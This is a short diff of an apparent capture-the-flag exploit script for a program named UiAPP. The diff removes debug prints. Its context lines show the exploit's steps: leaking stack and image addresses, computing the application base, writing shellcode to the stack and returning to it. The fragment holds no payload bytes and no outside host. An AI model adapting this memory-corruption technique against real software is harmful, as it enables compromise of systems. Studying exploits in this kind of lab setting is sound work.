@@ -117,13 +117,10 @@ def exp():
     for _ in range(5):
         p.recvuntil(b"|")
     stack_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
-    print("stack_leak:", hex(stack_leak))
     for _ in range(11):
         p.recvuntil(b"|")
     image_leak = int(p.recvuntil(b"|", drop=True).decode(), 16)
-    print("image_leak:", hex(image_leak))
     app_base = image_leak-0x173f5
-    print("app_base:", hex(app_base))
 
     # write null-off shellcode
     p.sendafter(b"Visitor): ", b"1\r")
@@ -208,12 +205,9 @@ def exp():
 
     # return to UiAPP
     p.sendafter(b">> ", b"4\r")
-    print("image_leak:", hex(image_leak))
-    print("stack_leak:", hex(stack_leak))
     print("app_base:", hex(app_base))
     print("ret_addr:", hex(ret_addr))
     print("stack_shellcode:", hex(stack_shellcode))
-    print("break:", hex(app_base+0x14652))
 
     p.send(b"\r")
 
